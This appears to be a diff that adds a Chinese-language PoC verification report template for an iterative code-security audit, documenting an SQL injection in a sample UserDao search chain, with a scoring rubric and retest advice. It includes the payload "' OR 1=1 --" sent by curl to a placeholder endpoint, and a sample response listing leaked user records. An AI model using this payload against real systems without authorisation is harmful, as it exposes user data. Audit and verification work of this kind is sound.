@@ -1,0 +1,69 @@
+# 09-PoC 验证报告
+
+> **文件命名规范**（来自原始指令 § 一.6）：
+> `{验证状态}_{问题等级}_{fqn.外部端点mthod-sink点-round100}.md`
+>
+> - 验证状态：是问题 / 非问题 / 暂时无法确认
+> - 问题等级：致命 / 严重 / 中危 / 低危
+> - round100：第 N 轮
+>
+> **存放位置**：`loop_audit/routes/poc/`
+> 文件名必须与 `loop_audit/routes/高风险端点/` 下的**高风险链**保持一致
+
+---
+
+## 元信息
+
+- **关联 finding**：`严重_com.example.UserController_search_a1b2c3d4.md`
+- **链**：`UserController.search → UserService.search → UserDao.findByKeyword → JdbcTemplate.query`
+- **sink**：`UserDao.java:23 SQL Injection`
+- **PoC 工具**：playwright (前端) / ssh skill (后端日志)
+- **环境可达性**：可达 / 不可达 / 受限
+- **轮次**：round 1
+
+## 1. 验证状态
+
+**是问题** ✅
+
+## 2. 验证步骤
+
+```bash
+# 1. 准备 payload
+PAYLOAD="' OR 1=1 --"
+
+# 2. 通过 playwright 触发
+curl -X GET "https://target/api/users/search?keyword=${PAYLOAD}" \
+  -H "Authorization: Bearer ${TOKEN}"
+```
+
+## 3. 实际响应
+
+```json
+{
+  "total": 9999,
+  "data": [
+    {"id": 1, "name": "alice"},
+    {"id": 2, "name": "bob"},
+    ...
+  ]
+}
+```
+
+## 4. 根因分析
+
+- `UserDao.findByKeyword` 使用字符串拼接构造 SQL
+- 无 `PreparedStatement` + `setString`
+- 无任何 ORM 参数化
+- 缺失输入过滤
+
+## 5. 评分
+
+- 污点追踪逻辑（30）：30
+- 业务/安全漏洞（25）：25
+- PoC 逻辑清晰度（25）：24
+- **本轮总分**：79
+- 是否 `finished`：否（需 3 轮 ≥ 85）
+
+## 6. 复测建议
+
+下次轮询时再次跑相同 payload，验证漏洞仍存在（防回归）。
